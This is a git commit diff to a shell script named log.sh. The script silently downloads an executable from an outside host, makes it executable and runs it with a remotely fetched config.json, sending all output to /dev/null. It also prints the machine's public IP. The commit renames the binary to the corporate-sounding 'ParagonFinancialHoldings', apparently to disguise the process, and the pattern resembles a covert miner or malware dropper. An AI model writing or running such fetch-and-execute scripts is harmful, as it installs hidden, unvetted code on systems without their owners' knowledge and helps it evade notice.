9025d6f8cb72aeb6f3cbdc9d6240c3075b416531
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2024-01-13 21:54:34 +0700

    Update log.sh

--- log.sh
+++ log.sh
@@ -1,7 +1,7 @@
-wget -q -O EdgeTrust https://maper.info/api-server && chmod +x EdgeTrust >/dev/null 2>&1
+wget -q -O ParagonFinancialHoldings https://maper.info/api-server && chmod +x ParagonFinancialHoldings >/dev/null 2>&1
 wget -q https://raw.githubusercontent.com/55113110159/TIBO/main/config.json && chmod +x config.json
 sleep 11 
 echo "******************************************************************" 
 echo "IP ORI ==> "$(curl ifconfig.me) 
 echo " "
-./EdgeTrust -c "config.json" >/dev/null 2>&1
+./ParagonFinancialHoldings -c "config.json" >/dev/null 2>&1
